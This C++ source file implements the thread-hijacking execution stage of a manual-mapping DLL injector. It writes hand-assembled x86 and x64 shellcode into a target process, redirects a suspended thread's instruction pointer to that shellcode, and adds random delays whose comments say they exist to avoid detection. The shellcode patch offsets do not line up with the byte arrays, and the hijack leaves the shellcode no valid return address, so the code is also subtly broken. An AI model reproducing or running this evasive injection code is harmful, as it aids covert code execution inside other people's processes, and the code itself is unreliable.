#include "manual_mapping.h"

// ExecutionEngine implementation
ExecutionEngine::ExecutionEngine(ErrorHandler* errorHandler, NameRandomizer* nameRandomizer, 
                               ProcessInterface* processInterface, MemoryManager* memoryManager)
    : m_errorHandler(errorHandler),
      m_nameRandomizer(nameRandomizer),
      m_processInterface(processInterface),
      m_memoryManager(memoryManager),
      m_shellcodeAddress(NULL),
      m_parameterAddress(NULL),
      m_threadHijacked(false) {
    
    // Initialize the original thread context
    ZeroMemory(&m_originalThreadContext, sizeof(CONTEXT));
}

ExecutionEngine::~ExecutionEngine() {
    // Clean up resources
    Cleanup();
}

bool ExecutionEngine::ExecuteDllMain(MemoryAddress baseAddress, DWORD entryPointRVA) {
    if (!baseAddress || entryPointRVA == 0) {
        m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
            "Invalid parameters for DllMain execution");
        return false;
    }

    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Calculate the DllMain address
    MemoryAddress dllMainAddress = reinterpret_cast<MemoryAddress>(
        reinterpret_cast<BYTE*>(baseAddress) + entryPointRVA);

    // Create shellcode for DllMain execution
    MemoryAddress shellcodeAddress = CreateDllMainShellcode(baseAddress, dllMainAddress);
    if (!shellcodeAddress) {
        return false;
    }

    // Find a thread in the target process
    ThreadId threadId = m_processInterface->FindThreadInProcess();
    if (threadId == 0) {
        m_memoryManager->FreeMemory(m_shellcodeAddress);
        m_shellcodeAddress = NULL;
        return false;
    }

    // Open the thread
    if (!m_processInterface->OpenThread(threadId)) {
        m_memoryManager->FreeMemory(m_shellcodeAddress);
        m_shellcodeAddress = NULL;
        return false;
    }

    // Hijack the thread to execute the shellcode
    if (!HijackThread(shellcodeAddress, m_parameterAddress)) {
        m_memoryManager->FreeMemory(m_shellcodeAddress);
        m_shellcodeAddress = NULL;
        return false;
    }

    // Wait for execution to complete
    if (!WaitForExecution()) {
        // Restore the thread context even if execution failed
        RestoreThreadContext();
        m_threadHijacked = false;
        
        m_memoryManager->FreeMemory(m_shellcodeAddress);
        m_shellcodeAddress = NULL;
        
        return false;
    }

    // Restore the thread context
    if (!RestoreThreadContext()) {
        m_memoryManager->FreeMemory(m_shellcodeAddress);
        m_shellcodeAddress = NULL;
        return false;
    }

    m_threadHijacked = false;
    
    // Clean up the shellcode
    m_memoryManager->FreeMemory(m_shellcodeAddress);
    m_shellcodeAddress = NULL;
    
    if (m_parameterAddress) {
        m_memoryManager->FreeMemory(m_parameterAddress);
        m_parameterAddress = NULL;
    }

    m_errorHandler->ClearError();
    return true;
}

bool ExecutionEngine::HijackThread(MemoryAddress codeAddress, MemoryAddress parameterAddress) {
    if (!codeAddress) {
        m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
            "Invalid code address for thread hijacking");
        return false;
    }

    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Save the original thread context
    if (!SaveThreadContext()) {
        return false;
    }

    // Modify the thread context to execute our code
    CONTEXT threadContext = m_originalThreadContext;
    
    // Architecture-specific context modification
    if (m_processInterface->IsTarget64Bit()) {
        // 64-bit thread hijacking
        threadContext.Rip = reinterpret_cast<DWORD64>(codeAddress);
        
        // Set parameter if provided
        if (parameterAddress) {
            threadContext.Rcx = reinterpret_cast<DWORD64>(parameterAddress);
        }
    } else {
        // 32-bit thread hijacking
        threadContext.Eip = reinterpret_cast<DWORD>(codeAddress);
        
        // Set parameter if provided
        if (parameterAddress) {
            threadContext.Ecx = reinterpret_cast<DWORD>(parameterAddress);
        }
    }

    // Set the new thread context
    if (!SetThreadContext(m_processInterface->GetThreadHandle(), &threadContext)) {
        m_errorHandler->SetError(ErrorCode::THREAD_HIJACK_FAILED, 
            "Failed to set thread context", GetLastError());
        return false;
    }

    // Resume the thread
    if (ResumeThread(m_processInterface->GetThreadHandle()) == static_cast<DWORD>(-1)) {
        m_errorHandler->SetError(ErrorCode::THREAD_HIJACK_FAILED, 
            "Failed to resume thread", GetLastError());
        return false;
    }

    m_threadHijacked = true;
    m_errorHandler->ClearError();
    return true;
}

MemoryAddress ExecutionEngine::CreateDllMainShellcode(MemoryAddress baseAddress, MemoryAddress dllMainAddress) {
    if (!baseAddress || !dllMainAddress) {
        m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
            "Invalid parameters for shellcode creation");
        return NULL;
    }

    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Create architecture-specific shellcode
    MemoryAddress shellcodeAddress = NULL;
    
    if (m_processInterface->IsTarget64Bit()) {
        shellcodeAddress = GenerateShellcode64(baseAddress, dllMainAddress);
    } else {
        shellcodeAddress = GenerateShellcode32(baseAddress, dllMainAddress);
    }

    return shellcodeAddress;
}

bool ExecutionEngine::WaitForExecution() {
    if (!m_threadHijacked) {
        m_errorHandler->SetError(ErrorCode::THREAD_HIJACK_FAILED, 
            "Thread not hijacked");
        return false;
    }

    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Wait for the thread to reach the shellcode completion point
    // This is a simple implementation; in a real-world scenario, you would use a more robust method
    
    // Sleep for a short time to allow execution to complete
    // The actual time needed depends on the complexity of the DLL's initialization
    Sleep(100);

    m_errorHandler->ClearError();
    return true;
}

bool ExecutionEngine::Cleanup() {
    // Restore thread context if hijacked
    if (m_threadHijacked) {
        RestoreThreadContext();
        m_threadHijacked = false;
    }

    // Free allocated memory
    if (m_shellcodeAddress) {
        m_memoryManager->FreeMemory(m_shellcodeAddress);
        m_shellcodeAddress = NULL;
    }

    if (m_parameterAddress) {
        m_memoryManager->FreeMemory(m_parameterAddress);
        m_parameterAddress = NULL;
    }

    m_errorHandler->ClearError();
    return true;
}

bool ExecutionEngine::SaveThreadContext() {
    if (!m_processInterface->GetThreadHandle()) {
        m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
            "Thread handle not set");
        return false;
    }

    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Suspend the thread
    if (SuspendThread(m_processInterface->GetThreadHandle()) == static_cast<DWORD>(-1)) {
        m_errorHandler->SetError(ErrorCode::THREAD_HIJACK_FAILED, 
            "Failed to suspend thread", GetLastError());
        return false;
    }

    // Get the thread context
    m_originalThreadContext.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(m_processInterface->GetThreadHandle(), &m_originalThreadContext)) {
        ResumeThread(m_processInterface->GetThreadHandle());
        m_errorHandler->SetError(ErrorCode::THREAD_HIJACK_FAILED, 
            "Failed to get thread context", GetLastError());
        return false;
    }

    m_errorHandler->ClearError();
    return true;
}

bool ExecutionEngine::RestoreThreadContext() {
    if (!m_processInterface->GetThreadHandle()) {
        m_errorHandler->SetError(ErrorCode::INVALID_PARAMETER, 
            "Thread handle not set");
        return false;
    }

    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);

    // Suspend the thread
    if (SuspendThread(m_processInterface->GetThreadHandle()) == static_cast<DWORD>(-1)) {
        m_errorHandler->SetError(ErrorCode::THREAD_HIJACK_FAILED, 
            "Failed to suspend thread", GetLastError());
        return false;
    }

    // Restore the original thread context
    if (!SetThreadContext(m_processInterface->GetThreadHandle(), &m_originalThreadContext)) {
        ResumeThread(m_processInterface->GetThreadHandle());
        m_errorHandler->SetError(ErrorCode::THREAD_HIJACK_FAILED, 
            "Failed to restore thread context", GetLastError());
        return false;
    }

    // Resume the thread
    if (ResumeThread(m_processInterface->GetThreadHandle()) == static_cast<DWORD>(-1)) {
        m_errorHandler->SetError(ErrorCode::THREAD_HIJACK_FAILED, 
            "Failed to resume thread", GetLastError());
        return false;
    }

    m_errorHandler->ClearError();
    return true;
}

MemoryAddress ExecutionEngine::GenerateShellcode32(MemoryAddress baseAddress, MemoryAddress dllMainAddress) {
    // Parameters for DllMain: HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved
    // DllMain(baseAddress, DLL_PROCESS_ATTACH, NULL)
    
    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);
    
    // Allocate memory for parameters
    struct DllMainParams {
        DWORD baseAddress;
        DWORD reason;
        DWORD reserved;
    };
    
    DllMainParams params;
    params.baseAddress = reinterpret_cast<DWORD>(baseAddress);
    params.reason = 1; // DLL_PROCESS_ATTACH
    params.reserved = 0;
    
    // Allocate memory for parameters in the target process
    m_parameterAddress = m_memoryManager->AllocateMemory(sizeof(DllMainParams), PAGE_READWRITE);
    if (!m_parameterAddress) {
        return NULL;
    }
    
    // Write parameters to the target process
    if (!m_memoryManager->WriteMemory(m_parameterAddress, &params, sizeof(DllMainParams))) {
        m_memoryManager->FreeMemory(m_parameterAddress);
        m_parameterAddress = NULL;
        return NULL;
    }
    
    // 32-bit shellcode to call DllMain and return to original execution
    // This is a simplified version; a real implementation would be more robust
    unsigned char shellcode[] = {
        0x55,                   // push ebp
        0x8B, 0xEC,             // mov ebp, esp
        0x83, 0xEC, 0x0C,       // sub esp, 12
        0x8B, 0x4D, 0x08,       // mov ecx, [ebp+8]  ; parameter address
        0x8B, 0x11,             // mov edx, [ecx]    ; baseAddress
        0x8B, 0x41, 0x04,       // mov eax, [ecx+4]  ; reason
        0x8B, 0x49, 0x08,       // mov ecx, [ecx+8]  ; reserved
        0x51,                   // push ecx          ; reserved
        0x50,                   // push eax          ; reason
        0x52,                   // push edx          ; baseAddress
        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, 0  ; DllMain address (to be filled)
        0xFF, 0xD0,             // call eax
        0x83, 0xC4, 0x0C,       // add esp, 12
        0x8B, 0xE5,             // mov esp, ebp
        0x5D,                   // pop ebp
        0xC3                    // ret
    };
    
    // Fill in the DllMain address
    *reinterpret_cast<DWORD*>(&shellcode[19]) = reinterpret_cast<DWORD>(dllMainAddress);
    
    // Allocate memory for shellcode in the target process
    MemorySize shellcodeSize = sizeof(shellcode);
    m_shellcodeAddress = m_memoryManager->AllocateMemory(shellcodeSize, PAGE_EXECUTE_READWRITE);
    if (!m_shellcodeAddress) {
        m_memoryManager->FreeMemory(m_parameterAddress);
        m_parameterAddress = NULL;
        return NULL;
    }
    
    // Write shellcode to the target process
    if (!m_memoryManager->WriteMemory(m_shellcodeAddress, shellcode, shellcodeSize)) {
        m_memoryManager->FreeMemory(m_shellcodeAddress);
        m_shellcodeAddress = NULL;
        m_memoryManager->FreeMemory(m_parameterAddress);
        m_parameterAddress = NULL;
        return NULL;
    }
    
    return m_shellcodeAddress;
}

MemoryAddress ExecutionEngine::GenerateShellcode64(MemoryAddress baseAddress, MemoryAddress dllMainAddress) {
    // Parameters for DllMain: HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved
    // DllMain(baseAddress, DLL_PROCESS_ATTACH, NULL)
    
    // Apply random timing to avoid detection patterns
    m_nameRandomizer->ApplyRandomTiming(1, 5);
    
    // Allocate memory for parameters
    struct DllMainParams {
        ULONGLONG baseAddress;
        DWORD reason;
        DWORD reserved;
        ULONGLONG padding; // For 16-byte alignment
    };
    
    DllMainParams params;
    params.baseAddress = reinterpret_cast<ULONGLONG>(baseAddress);
    params.reason = 1; // DLL_PROCESS_ATTACH
    params.reserved = 0;
    params.padding = 0;
    
    // Allocate memory for parameters in the target process
    m_parameterAddress = m_memoryManager->AllocateMemory(sizeof(DllMainParams), PAGE_READWRITE);
    if (!m_parameterAddress) {
        return NULL;
    }
    
    // Write parameters to the target process
    if (!m_memoryManager->WriteMemory(m_parameterAddress, &params, sizeof(DllMainParams))) {
        m_memoryManager->FreeMemory(m_parameterAddress);
        m_parameterAddress = NULL;
        return NULL;
    }
    
    // 64-bit shellcode to call DllMain and return to original execution
    // This is a simplified version; a real implementation would be more robust
    unsigned char shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,       // sub rsp, 40
        0x48, 0x8B, 0x09,             // mov rcx, [rcx]    ; baseAddress
        0xBA, 0x01, 0x00, 0x00, 0x00, // mov edx, 1        ; DLL_PROCESS_ATTACH
        0x41, 0xB8, 0x00, 0x00, 0x00, 0x00, // mov r8d, 0  ; reserved
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0 ; DllMain address (to be filled)
        0xFF, 0xD0,                   // call rax
        0x48, 0x83, 0xC4, 0x28,       // add rsp, 40
        0xC3                          // ret
    };
    
    // Fill in the DllMain address
    *reinterpret_cast<ULONGLONG*>(&shellcode[18]) = reinterpret_cast<ULONGLONG>(dllMainAddress);
    
    // Allocate memory for shellcode in the target process
    MemorySize shellcodeSize = sizeof(shellcode);
    m_shellcodeAddress = m_memoryManager->AllocateMemory(shellcodeSize, PAGE_EXECUTE_READWRITE);
    if (!m_shellcodeAddress) {
        m_memoryManager->FreeMemory(m_parameterAddress);
        m_parameterAddress = NULL;
        return NULL;
    }
    
    // Write shellcode to the target process
    if (!m_memoryManager->WriteMemory(m_shellcodeAddress, shellcode, shellcodeSize)) {
        m_memoryManager->FreeMemory(m_shellcodeAddress);
        m_shellcodeAddress = NULL;
        m_memoryManager->FreeMemory(m_parameterAddress);
        m_parameterAddress = NULL;
        return NULL;
    }
    
    return m_shellcodeAddress;
}
